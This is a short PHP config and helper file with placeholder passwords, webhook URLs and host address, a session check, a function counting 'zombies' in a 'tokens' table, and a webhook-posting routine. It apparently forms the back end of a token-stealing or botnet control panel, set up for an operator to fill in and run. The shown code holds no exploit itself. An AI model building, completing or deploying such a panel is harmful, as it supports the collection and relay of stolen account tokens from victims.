<?php
    require_once('database.php');
    $login_password = "PASSWORD FOR SIGN IN";
    $api_password = "PASSWORD FOR API";

    $logs_webhook = "LOGS WEBHOOK";
    $api_webhook = "API WEBHOOK";

    $base_url = "BASE URL/IP OF YOUR HOST";

    function CheckLogin(){
        if(isset($_SESSION['token'])) {
            return true;
        } else {
            return false;
        }
    }

    function ZombiesCount(){
        global $bdd;
        $req = $bdd->prepare('SELECT * FROM tokens');
        $req->execute();
        return $req->rowCount();
    }

    function SendToWebhook($webhook, $data) {
        $ch = curl_init($webhook);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        curl_exec($ch);
        curl_close($ch);
    }

?>
